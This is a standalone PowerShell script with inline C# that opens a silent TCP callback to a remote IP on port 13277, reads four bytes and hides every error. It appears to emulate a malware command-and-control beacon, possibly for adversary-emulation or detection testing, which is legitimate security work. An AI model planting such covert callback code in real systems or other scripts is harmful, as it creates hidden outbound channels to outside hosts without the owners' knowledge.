Add-Type @"
using System;
using System.Net;
using System.Net.Sockets;

public class TopinambourCallback {
    public static void Connect(string ip) {
        IPAddress addr = IPAddress.Parse(ip);
        IPEndPoint remoteEP = new IPEndPoint(addr, 13277);
        Socket socket = new Socket(addr.AddressFamily, SocketType.Stream, ProtocolType.Tcp);
        socket.ReceiveTimeout = 20000;
        socket.SendTimeout = 60000;
        socket.Blocking = false;
        try { socket.Connect(remoteEP); } catch (SocketException) { }
        if (!socket.Poll(5000000, SelectMode.SelectWrite)) {
            socket.Close();
            return;
        }
        socket.Blocking = true;
        byte[] array = new byte[4];
        socket.Receive(array, 4, SocketFlags.None);
        socket.Close();
    }
}
"@
try { [TopinambourCallback]::Connect($callbackIP) } catch { }

